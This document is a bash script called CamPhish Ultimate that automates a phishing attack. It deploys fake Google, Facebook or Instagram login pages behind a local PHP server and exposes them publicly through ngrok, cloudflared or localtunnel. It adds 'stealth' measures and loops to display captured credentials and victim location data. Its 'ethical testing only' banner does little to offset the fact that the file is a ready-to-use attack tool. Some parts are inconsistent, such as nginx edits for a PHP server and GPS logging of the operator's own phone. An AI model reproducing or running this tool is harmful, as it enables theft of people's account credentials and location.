#!/bin/bash

# CamPhish Ultimate v4.0
# Developed by Rayhan
# Features: Auto-Install, Multi-Tunnel, GPS Tracking, Advanced Stealth Mode

# Configuration
VERSION="4.0"
DEVELOPER="Rayhan"
GITHUB_REPO="https://github.com/your-repo/CamPhish-Ultimate"
DEFAULT_PORT="3333"
LOGFILE="phish.log"

# Colors
BLACK='\033[0;30m'
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[0;37m'
NC='\033[0m'

# ASCII Art Banner
show_banner() {
    clear
    echo -e "${PURPLE}"
    echo -e "   ____                        _   _       _     _ "
    echo -e "  / ___|__ _ _ __ ___  ___ ___| | | |_ __ (_) __| |"
    echo -e " | |   / _\` | '__/ __|/ __/ __| |_| | '_ \| |/ _\` |"
    echo -e " | |__| (_| | |  \__ \ (__\__ \  _  | | | | | (_| |"
    echo -e "  \____\__,_|_|  |___/\___|___/_| |_|_| |_|_|\__,_|"
    echo -e "${NC}"
    echo -e "${CYAN}          CamPhish Ultimate v${VERSION} by ${DEVELOPER}${NC}"
    echo -e "${YELLOW}       For Ethical Penetration Testing Only${NC}"
    echo -e "${BLUE}------------------------------------------------${NC}"
    echo -e "${RED}WARNING: Unauthorized access is illegal. Use responsibly.${NC}"
}

# System Check
system_check() {
    echo -e "${BLUE}[*] Running system diagnostics...${NC}"
    
    # Check OS
    if [[ -f "/etc/os-release" ]]; then
        OS=$(grep PRETTY_NAME /etc/os-release | cut -d= -f2 | tr -d '"')
    elif [[ $(uname -o) == "Android" ]]; then
        OS="Termux/Android"
    else
        OS=$(uname -s)
    fi
    
    # Check Architecture
    ARCH=$(uname -m)
    
    echo -e "${GREEN}[+] System Detected: ${OS} (${ARCH})${NC}"
}

# Dependency Installer
install_dependencies() {
    echo -e "${BLUE}[*] Checking dependencies...${NC}"
    
    declare -A packages=(
        ["php"]="php"
        ["curl"]="curl"
        ["wget"]="wget"
        ["unzip"]="unzip"
        ["git"]="git"
    )
    
    # Detect package manager
    if command -v apt &>/dev/null; then
        PM="apt"
    elif command -v pkg &>/dev/null; then
        PM="pkg"
    elif command -v yum &>/dev/null; then
        PM="yum"
    else
        echo -e "${RED}[-] Unsupported package manager${NC}"
        exit 1
    fi
    
    # Update repositories
    echo -e "${YELLOW}[*] Updating package repositories...${NC}"
    $PM update -y
    
    # Install missing packages
    for cmd in "${!packages[@]}"; do
        if ! command -v $cmd &>/dev/null; then
            echo -e "${YELLOW}[+] Installing ${packages[$cmd]}...${NC}"
            $PM install -y ${packages[$cmd]}
        fi
    done
    
    # Termux specific setup
    if [[ $OS == "Termux/Android" ]]; then
        echo -e "${YELLOW}[*] Configuring Termux environment...${NC}"
        termux-setup-storage
        pkg install -y termux-api
        echo -e "${YELLOW}[!] Please grant Termux storage and camera permissions${NC}"
    fi
    
    echo -e "${GREEN}[+] All dependencies installed${NC}"
}

# Tunnel Manager
setup_tunnel() {
    echo -e "${BLUE}[*] Configuring tunneling options...${NC}"
    
    declare -A tunnels=(
        ["ngrok"]="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz"
        ["cloudflared"]="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
        ["localtunnel"]="npm install -g localtunnel"
    )
    
    for tunnel in "${!tunnels[@]}"; do
        if [[ ! -f $tunnel ]]; then
            echo -e "${YELLOW}[+] Installing ${tunnel}...${NC}"
            if [[ $tunnel == "ngrok" ]]; then
                wget -q --show-progress ${tunnels[$tunnel]} -O ngrok.tgz
                tar -xzf ngrok.tgz
                rm ngrok.tgz
            elif [[ $tunnel == "cloudflared" ]]; then
                wget -q --show-progress ${tunnels[$tunnel]} -O cloudflared
                chmod +x cloudflared
            else
                npm install -g localtunnel
            fi
        fi
    done
    
    # Ngrok authentication
    if [[ ! -f "$HOME/.ngrok2/ngrok.yml" ]]; then
        echo -e "${YELLOW}[!] Ngrok authentication required${NC}"
        read -p "Enter your Ngrok authtoken: " authtoken
        ./ngrok authtoken $authtoken
    fi
    
    echo -e "${GREEN}[+] Tunneling services ready${NC}"
}

# Advanced Template System
setup_templates() {
    echo -e "${BLUE}[*] Loading phishing templates...${NC}"
    
    templates=(
        "Google Login"
        "Facebook Login"
        "Instagram Login"
        "Custom Template"
    )
    
    select template in "${templates[@]}"; do
        case $template in
            "Google Login")
                cp templates/google.html index.html
                break
                ;;
            "Facebook Login")
                cp templates/facebook.html index.html
                break
                ;;
            "Instagram Login")
                cp templates/instagram.html index.html
                break
                ;;
            "Custom Template")
                read -p "Enter custom template path: " custom_template
                cp "$custom_template" index.html
                break
                ;;
            *)
                echo -e "${RED}[-] Invalid selection${NC}"
                ;;
        esac
    done
    
    echo -e "${GREEN}[+] Template activated: ${template}${NC}"
}

# Stealth Mode
enable_stealth() {
    echo -e "${BLUE}[*] Configuring stealth mode...${NC}"
    
    # Randomize server headers
    sed -i "s/Server:.*/Server: Apache\/2.4.29 (Ubuntu)/g" /etc/nginx/nginx.conf
    
    # Enable HTTPS
    if [[ ! -f server.pem ]]; then
        openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes -subj "/C=US/ST=California/L=San Francisco/O=Global Security/OU=IT Department/CN=example.com"
    fi
    
    # IP masking
    iptables -t nat -A POSTROUTING -j MASQUERADE
    
    echo -e "${GREEN}[+] Stealth mode activated${NC}"
}

# GPS Tracker (Termux only)
enable_gps() {
    if [[ $OS == "Termux/Android" ]]; then
        echo -e "${BLUE}[*] Enabling GPS tracking...${NC}"
        
        if ! command -v termux-location &>/dev/null; then
            pkg install -y termux-api
        fi
        
        termux-location > gps.log &
        echo -e "${GREEN}[+] GPS tracking active${NC}"
    else
        echo -e "${YELLOW}[!] GPS tracking only available on Termux${NC}"
    fi
}

# Main Attack Vector
launch_attack() {
    echo -e "${BLUE}[*] Initializing attack sequence...${NC}"
    
    # Start PHP server
    php -S 127.0.0.1:$DEFAULT_PORT > /dev/null 2>&1 &
    
    # Select tunneling method
    options=(
        "Ngrok (Recommended)"
        "Cloudflared"
        "Localtunnel"
        "Local Network"
    )
    
    select opt in "${options[@]}"; do
        case $opt in
            "Ngrok (Recommended)")
                ./ngrok http $DEFAULT_PORT > /dev/null 2>&1 &
                sleep 5
                link=$(curl -s http://localhost:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok.io')
                break
                ;;
            "Cloudflared")
                ./cloudflared tunnel --url http://localhost:$DEFAULT_PORT > /dev/null 2>&1 &
                sleep 7
                link=$(grep -o 'https://[^/"]*\.trycloudflare.com' .cloudflared.log | head -n 1)
                break
                ;;
            "Localtunnel")
                lt --port $DEFAULT_PORT --subdomain rayhanphish > /dev/null 2>&1 &
                sleep 5
                link="https://rayhanphish.loca.lt"
                break
                ;;
            "Local Network")
                ip=$(hostname -I | awk '{print $1}')
                link="http://$ip:$DEFAULT_PORT"
                break
                ;;
            *)
                echo -e "${RED}[-] Invalid option${NC}"
                ;;
        esac
    done
    
    if [[ -z "$link" ]]; then
        echo -e "${RED}[-] Failed to establish tunnel${NC}"
        exit 1
    fi
    
    echo -e "${GREEN}[+] Phishing URL: ${PURPLE}${link}${NC}"
    echo -e "${YELLOW}[*] Monitoring for connections... (Ctrl+C to stop)${NC}"
    
    # Real-time monitoring
    while true; do
        if [[ -f "credentials.txt" ]]; then
            echo -e "\n${RED}[!] CREDENTIALS CAPTURED!${NC}"
            cat credentials.txt
            mv credentials.txt "creds_$(date +%s).log"
        fi
        
        if [[ -f "location.log" ]]; then
            echo -e "\n${RED}[!] LOCATION DATA CAPTURED!${NC}"
            cat location.log
            mv location.log "location_$(date +%s).log"
        fi
        
        sleep 3
    done
}

# Cleanup
cleanup() {
    echo -e "\n${RED}[!] Cleaning up...${NC}"
    
    # Kill all background processes
    pkill -f php ngrok cloudflared lt
    
    # Clear logs
    rm -f *.log credentials.txt location.log 2>/dev/null
    
    # Reset iptables
    iptables -t nat -F
    
    echo -e "${GREEN}[+] Cleanup complete. Exiting...${NC}"
    exit 0
}

# Main Execution
trap cleanup SIGINT
show_banner
system_check
install_dependencies
setup_tunnel
setup_templates
enable_stealth
enable_gps
launch_attack
